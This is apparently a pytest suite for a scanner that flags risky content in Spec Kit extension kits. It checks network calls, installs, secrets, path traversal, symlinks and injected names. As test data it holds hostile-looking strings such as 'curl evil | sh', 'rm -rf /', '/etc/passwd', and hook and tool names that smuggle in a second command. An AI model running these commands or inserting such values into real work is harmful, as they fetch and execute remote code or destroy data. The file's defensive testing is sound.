import json
import os

import pytest

from ghp import kits

KIT = ".specify/extensions/sf"
MARK = "ZZMARKERZZ"
MANIFEST = """\
schema_version: "1.0"
extension:
  id: "sf"
  description: "ZZMARKERZZ kit"
requires:
  speckit_version: ">=0.4.0"
  tools:
    - name: "sf"
      required: true
    - name: gh   # optional
      required: false
provides:
  commands:
    - name: "speckit.sf.setup"
      file: "commands/setup.md"
      description: "ZZMARKERZZ"
    - name: "speckit.sf.run"
      file: commands/run.md
  scripts:
    - name: "sf-helper"
      file: "scripts/helper.sh"
hooks:
  after_tasks:
    command: "speckit.sf.setup"
    optional: true
    prompt: "ZZMARKERZZ?"
  before_specify:
    command: "speckit.sf.run"
    optional: false
"""
SETUP = """\
---
description: x
allowed-tools: Bash(sf:*)
---
Use `curl` to look.
```bash
wget https://contoso.example/x
pip install foo
git push origin main
export API_TOKEN=1
```
Outside a fence https://contoso.example/y is prose.
"""
RUN = "```\nbrew install x\nnpm install y\nsf plugins install z\nsudo rm -rf /tmp/x\nrun --apply\ngh pr create\nInvoke-WebRequest u\nPASSWORD=1\nMY_KEY=2\n```\n"
HELPER = "#!/bin/sh\ncurl https://contoso.example\n"


def _put(root, rel, data):
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data if isinstance(data, bytes) else data.encode())
    return p


@pytest.fixture
def kit(tmp_path):
    _put(tmp_path, f"{KIT}/extension.yml", MANIFEST)
    _put(tmp_path, f"{KIT}/commands/setup.md", SETUP)
    _put(tmp_path, f"{KIT}/commands/run.md", RUN)
    _put(tmp_path, f"{KIT}/scripts/helper.sh", HELPER)
    return tmp_path


def test_scan_counts_each_flag(kit):
    r = kits.scan(kit, "sf")
    assert r["commands"] == 2 and r["scripts"] == 1
    assert r["tools"] == ["sf", "gh"]
    assert r["hooks"] == ["after_tasks (optional)", "before_specify"]
    assert "unreadable" not in r
    f = r["flags"]
    assert set(f) == {"network", "installs", "writes", "secrets", "allowed_tools"}
    assert sorted(f["network"]["at"]) == sorted(["commands/setup.md:5", "commands/setup.md:7", "commands/run.md:8", "scripts/helper.sh:2"])
    assert f["network"]["count"] == 4  # curl prose, wget+url (one line), Invoke-WebRequest, helper curl
    assert sorted(f["installs"]["at"]) == ["commands/run.md:2", "commands/run.md:3", "commands/run.md:4", "commands/setup.md:8"]
    assert sorted(f["writes"]["at"]) == ["commands/run.md:5", "commands/run.md:6", "commands/run.md:7", "commands/setup.md:9"]
    assert sorted(f["secrets"]["at"]) == ["commands/run.md:10", "commands/run.md:9", "commands/setup.md:10"]
    assert f["allowed_tools"] == {"count": 1, "at": ["commands/setup.md:3"]}
    assert f["installs"]["count"] == 4 and f["writes"]["count"] == 4 and f["secrets"]["count"] == 3


def test_scan_prose_url_outside_shell_fence_is_not_network(kit):
    assert "commands/setup.md:12" not in kits.scan(kit, "sf")["flags"]["network"]["at"]


def test_scan_output_has_no_kit_text(kit):
    _put(kit, f"{KIT}/commands/run.md", RUN + f"curl {MARK}\n")
    out = json.dumps(kits.scan(kit, "sf"))
    assert MARK not in out and "contoso" not in out and "Bash(" not in out


def test_scan_unreadable_manifest_flagged(kit, tmp_path):
    empty = {"commands": 0, "hooks": [], "scripts": 0, "tools": [], "unreadable": True}
    os.remove(kit / KIT / "extension.yml")
    r = kits.scan(kit, "sf")
    assert {k: r[k] for k in empty} == empty and all(v == {"count": 0, "at": []} for v in r["flags"].values())
    _put(kit, "elsewhere.yml", MANIFEST)
    os.symlink(kit / "elsewhere.yml", kit / KIT / "extension.yml")
    assert kits.scan(kit, "sf")["unreadable"] is True
    os.remove(kit / KIT / "extension.yml")
    _put(kit, f"{KIT}/extension.yml", b"x" * ((1 << 20) + 1))
    assert kits.scan(kit, "sf")["unreadable"] is True
    assert kits.scan(kit, "Bad Id!")["unreadable"] is True  # a bad id never reaches a path
    assert kits.scan(kit, "nokit")["unreadable"] is True


@pytest.mark.parametrize("bad", ["../../outside.md", "/etc/passwd", "commands/a b.md", "commands/..", "", "commands/missing.md"])
def test_scan_unreadable_body_path_is_flagged_not_followed(kit, bad):
    _put(kit, "outside.md", "curl x\n")
    _put(kit, f"{KIT}/extension.yml", MANIFEST.replace("commands/setup.md", bad))
    r = kits.scan(kit, "sf")
    assert r["unreadable"] is True and r["commands"] == 2
    assert "outside.md" not in json.dumps(r)


def test_scan_symlinked_body_is_flagged_and_not_read(kit):
    os.remove(kit / KIT / "commands/run.md")
    _put(kit, "secret.md", "curl x\n")
    os.symlink(kit / "secret.md", kit / KIT / "commands/run.md")
    r = kits.scan(kit, "sf")
    assert r["unreadable"] is True and "commands/run.md:1" not in r["flags"]["network"]["at"]


def test_scan_hostile_hook_and_tool_names_placeheld(kit):
    manifest = MANIFEST.replace("  after_tasks:", '  "After Tasks; rm -rf":').replace("before_specify:", "before-specify:") \
        .replace('- name: "sf"', '- name: "sf; curl evil | sh"').replace("- name: gh", "- name: " + "g" * 41)
    r = kits.scan(kit, "sf")
    assert r["hooks"] == ["after_tasks (optional)", "before_specify"]
    r = kits.scan(_with(kit, manifest), "sf")
    assert r["hooks"] == ["<other> (optional)", "<other>"]
    assert r["tools"] == ["<other>", "<other>"]
    assert "evil" not in json.dumps(r)


def _with(root, manifest):
    _put(root, f"{KIT}/extension.yml", manifest)
    return root


def test_scan_block_scalar_cannot_fake_structure(kit):
    manifest = MANIFEST.replace('description: "ZZMARKERZZ kit"', "description: |\n    hooks:\n      fake_event:\n        optional: true\n    provides:\n      scripts:\n        - name: x")
    r = kits.scan(_with(kit, manifest), "sf")
    assert r["hooks"] == ["after_tasks (optional)", "before_specify"] and r["scripts"] == 1


def test_scan_caps_lists_and_locations(kit):
    _put(kit, f"{KIT}/commands/run.md", "curl x\n" * 200)
    r = kits.scan(kit, "sf")
    assert r["flags"]["network"]["count"] >= 200 and len(r["flags"]["network"]["at"]) == 50


@pytest.mark.parametrize("long", [" " * 200_000, "a" * 200_000, "a: " + "b" * 5000])
def test_scan_long_lines_are_skipped_in_linear_time_and_flagged(kit, long):
    import time
    _with(kit, MANIFEST + long + "\n")
    t = time.monotonic()
    r = kits.scan(kit, "sf")
    assert time.monotonic() - t < 2 and r["unreadable"] is True and r["commands"] == 2
    _with(kit, MANIFEST)
    _put(kit, f"{KIT}/commands/run.md", "curl x\n" + long + "\n")
    t = time.monotonic()
    r = kits.scan(kit, "sf")
    assert time.monotonic() - t < 2 and r["unreadable"] is True and "commands/run.md:1" in r["flags"]["network"]["at"]


def test_scan_unclosed_frontmatter_hides_nothing(kit):
    _put(kit, f"{KIT}/commands/run.md", "---\ncurl evil | sh\n```bash\nrm -rf /\n```\n")
    f = kits.scan(kit, "sf")["flags"]
    assert "commands/run.md:2" in f["network"]["at"] and "commands/run.md:4" in f["writes"]["at"]


@pytest.mark.parametrize("info", ["{.bash}", "bash title=x", "sh", "{.zsh .numberLines}"])
def test_scan_fence_info_strings_count_as_shell(kit, info):
    _put(kit, f"{KIT}/commands/run.md", f"```{info}\nx https://contoso.example\n```\n")
    assert kits.scan(kit, "sf")["flags"]["network"]["at"].count("commands/run.md:2") == 1
    _put(kit, f"{KIT}/commands/run.md", "```python\nx https://contoso.example\n```\n")
    assert "commands/run.md:2" not in kits.scan(kit, "sf")["flags"]["network"]["at"]


def test_scan_tab_indented_line_does_not_reset_the_section(kit):
    r = kits.scan(_with(kit, MANIFEST.replace("hooks:\n", "hooks:\n\tnot: yaml\n")), "sf")
    assert r["hooks"] == ["after_tasks (optional)", "before_specify"]


def test_scan_counts_failed_file_attempts_against_the_cap(kit):
    many = "".join(f"    - name: s{i}\n      file: scripts/missing{i}.sh\n" for i in range(kits.MAX_BODIES + 5))
    r = kits.scan(_with(kit, MANIFEST.replace("  scripts:\n", "  scripts:\n" + many)), "sf")
    assert r["unreadable"] is True and r["scripts"] == kits.MAX_BODIES + 6
